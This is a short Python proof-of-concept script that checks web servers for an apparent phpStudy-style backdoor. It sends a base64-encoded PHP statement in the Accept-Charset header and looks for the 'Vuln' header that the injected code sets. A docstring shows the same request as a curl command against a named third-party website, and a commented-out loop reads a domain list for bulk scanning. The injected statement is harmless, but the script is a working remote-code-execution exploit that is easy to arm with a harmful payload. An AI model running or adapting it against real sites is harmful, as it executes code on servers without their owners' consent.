#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
import sys



headers = {
    'Accept-Encoding': 'gzip,deflate',
    'Accept-Charset': 'aGVhZGVyKCdWdWxuOiBZRVMnKTs='
}

def poc(url):
    '''usage
    curl -H "Accept-Encoding: gzip,deflate" -H "Accept-Charset: aGVhZGVyKCdWdWxuOiBZRVMnKTs=" -X HEAD  -v http://beyondnewspaper.com/
    '''
    #for domain in open('domainsList.txt', 'r'):
    domain = url if "//" in url else "http://"+url
    try:
        r = requests.head(domain,headers = headers, timeout=8)
        if 'Vuln' in r.headers:
            #print('[+] %s is Vulnerable' % domain)
            return url
        else:
            pass
            #print('[-] %s NOT Vulnerable' % domain)
    except:
        #print('[-] %s NOT Vulnerable' % domain)
        pass
        
    return False
if  __name__ == '__main__':
    poc(sys.argv[1])